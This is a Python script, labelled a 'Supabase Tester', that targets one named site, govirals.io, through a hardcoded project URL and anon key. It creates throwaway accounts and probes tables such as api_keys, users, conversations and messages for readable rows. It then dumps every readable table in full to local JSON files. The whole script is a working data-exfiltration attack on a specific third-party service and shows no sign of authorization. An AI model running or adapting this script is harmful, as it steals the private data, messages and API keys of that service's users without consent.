import requests
import random
import time
import json
import os
from datetime import datetime

# ========================= CONFIG =========================
SUPABASE_URL = "https://eqewavelrcstlowjuisp.supabase.co"
ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVxZXdhdmVscmNzdGxvd2p1aXNwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIyMzQxNzksImV4cCI6MjA4NzgxMDE3OX0.t4CS8lfR6XJP__Ja1E2q4iA8rKA0EbLkoRQsrE-eXUc"   # ← Replace with real key from browser

DUMP_FOLDER = "govirals_dump"
# =========================================================

headers = {
    "apikey": ANON_KEY,
    "Authorization": f"Bearer {ANON_KEY}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

def test_create_account():
    print("\n[*] Testing account creation...")
    email = f"test{random.randint(10000,99999)}@gmail.com"
    password = "TestPass123!"

    payload = {
        "email": email,
        "password": password,
        "data": {"source": "test_script"}
    }

    r = requests.post(f"{SUPABASE_URL}/auth/v1/signup", json=payload, headers=headers)
    
    print(f"Status: {r.status_code}")
    if r.status_code in (200, 201):
        print(f"[+] Account created successfully: {email}")
        return True
    else:
        print(f"[-] Failed: {r.text[:300]}")
        return False

def probe_readable_tables():
    print("\n[*] Probing readable tables...")
    tables = ["projects", "api_keys", "conversations", "messages", "credits", "users", "profiles", "settings"]
    readable = []

    for table in tables:
        r = requests.get(f"{SUPABASE_URL}/rest/v1/{table}?limit=2", headers=headers)
        if r.status_code == 200:
            data = r.json()
            count = len(data)
            print(f"   {table:15} → {r.status_code} ({count} rows visible)")
            if count > 0:
                readable.append((table, data))
        else:
            print(f"   {table:15} → {r.status_code}")
        time.sleep(0.5)
    
    return readable

def dump_database(readable_tables):
    os.makedirs(DUMP_FOLDER, exist_ok=True)
    print(f"\n[*] Starting database dump into → {DUMP_FOLDER}/")
    
    for table, _ in readable_tables:
        print(f"Dumping {table}...")
        r = requests.get(f"{SUPABASE_URL}/rest/v1/{table}?select=*", headers=headers)
        if r.status_code == 200:
            data = r.json()
            with open(f"{DUMP_FOLDER}/{table}.json", "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"   [+] Saved {len(data)} rows")
        time.sleep(1)
    
    print(f"[+] Dump completed! Check folder: {DUMP_FOLDER}/")

def main():
    print("="*60)
    print("          govirals.io Supabase Tester")
    print("="*60)

    if ANON_KEY == "YOUR_ANON_KEY_HERE":
        print("❌ Please put your real ANON_KEY in the script first!")
        return

    # Test 1: Account Creation
    test_create_account()

    # Test 2: Probe readable data
    readable = probe_readable_tables()

    # Ask user if they want to dump
    print("\n" + "="*50)
    choice = input("Do you want to dump this database (if possible)? (yes/no): ").strip().lower()
    
    if choice in ["yes", "y"]:
        dump_database(readable)
    else:
        print("Dump skipped.")

    print("\n[*] Test finished.")

if __name__ == "__main__":
    main()